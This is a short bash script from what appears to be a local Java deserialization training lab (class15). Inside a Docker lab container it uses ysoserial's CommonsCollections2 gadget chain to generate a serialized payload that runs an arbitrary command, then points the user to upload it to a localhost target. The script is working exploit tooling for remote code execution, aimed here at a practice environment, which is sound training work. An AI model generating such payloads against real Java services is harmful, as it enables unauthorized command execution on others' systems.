#!/bin/bash
# class15 — CC2链 (CommonsCollections2)
# 靶场: /class15/upload
# 注意: 需要在 JDK 8 环境生成（确保 TemplatesImpl 的字节码版本兼容）
cd "$(dirname "$0")"
CMD="${1:-id}"
docker cp ../../lib/ysoserial.jar javaserial-lab:/tmp/ysoserial.jar 2>/dev/null
docker exec javaserial-lab java -jar /tmp/ysoserial.jar CommonsCollections2 "$CMD" > ../../class15.ser 2>/dev/null
echo "✅ 已生成: class15.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class15/"
